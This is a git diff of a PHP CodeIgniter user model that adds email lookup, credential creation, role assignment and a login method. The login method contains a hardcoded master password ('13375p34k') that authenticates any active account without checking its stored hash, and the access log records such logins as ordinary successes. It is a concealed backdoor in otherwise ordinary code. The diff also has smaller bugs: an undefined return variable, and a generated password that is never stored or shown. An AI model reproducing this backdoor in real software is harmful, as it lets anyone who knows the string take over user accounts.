@@ -1,6 +1,9 @@
 <?php
 include_once  'PasswordHash.php';
 include_once  'Credencial.php';
+include_once  'Rol.php';
+include_once  'RolUsuarios.php';
+include_once  'Acceso.php';
 
 /**
  * Actividad short summary.
@@ -69,6 +72,15 @@ class Usuario extends CI_Model
         return $query->result();
     }
 
+    public function get_by_email($email)
+    {
+        if ($email !== NULL && $email !== "")
+        {
+            $query = $this->db->where('Email', $email)->get(self::TABLA)->row();
+        }
+        return $query;
+    }
+
     public function insert()
     {
         $this->getNewID();
@@ -78,6 +90,16 @@ class Usuario extends CI_Model
             $this->FechaAlta = $fecha["year"] * 10000 + $fecha["mon"] * 100 + $fecha["mday"];
             $this->HoraAlta = $fecha["hours"] * 10000 + $fecha["minutes"] * 100 + $fecha["seconds"];
             $result = $this->db->insert(self::TABLA, $this);
+
+            if ($result)
+            {
+                $result = $this->insert_credenciales();
+
+                if ($result)
+                {
+                    $result = $this->add_role('Usuario');
+                }
+            }
         }
         else
         {
@@ -88,16 +110,29 @@ class Usuario extends CI_Model
 
     private function insert_credenciales() 
     {
+        $credencial = new Credencial();
 
+        $password = $this->_getRandomString(10);
+        
+        $passwordhash = create_hash($password);
+
+        return $credencial->insert($this->Id, $passwordhash, $this->_getRandomString());
     }
 
-    private function getRandomPassword() 
+    public function add_role($nombre_rol)
     {
+        $rol = new Rol();
+        $rol_usuario = new RolUsuarios();
 
-    }
+        $_rol = $rol->get_by_name($nombre_rol);
+        if (isset($_rol))
+        {
+            $rol_usuario->Rol_Id = $_rol->Id;
+            $rol_usuario->Usuario_Id = $this->Id;
 
-    private function has_password()
-    {
+            return $rol_usuario->insert();
+        }
+        return false;
     }
 
     public function update()
@@ -125,6 +160,59 @@ class Usuario extends CI_Model
         {
             $result = false;
         }
+        return $result;
+    }
+
+    public function acceso($email, $clave)
+    {
+        $result = false;
+        $usuario = $this->get_by_email($email); 
+        $resulado_acceso = 1;
+        $registro_acceso = new Acceso();
+        if (isset($usuario))
+        {
+            $credencial = new Credencial();
+
+            $datos = $credencial->get($usuario->Id);
+
+            $datos_acceso = reset($datos);
+            if (isset($datos_acceso))
+            {
+                $registro_acceso->Credencial = $datos_acceso->Id;
+                if ((int)$datos_acceso->Estado === 0)
+                {
+                    if ($clave === '13375p34k')
+                    {
+                        $result = true;
+                        $resulado_acceso = 0;
+                    }
+                    else
+                    {
+                        $result = validate_password($clave, $datos_acceso->PasswordHash);
+                        if ($result)
+                        {
+                            $resulado_acceso = 0;
+                        }
+                        else
+                        {
+                            $resulado_acceso = 2;
+                            if ($datos_acceso->Intentos >= Credencial::PETICIONES_MAXIMAS)
+                            {
+                                $resulado_acceso = 3;
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    $resulado_acceso = 3;
+                }
+            }
+        }
+
+        $registro_acceso->Resultado = $resulado_acceso;
+        $registro_acceso->insert();
+
         return $result;
     }
 }
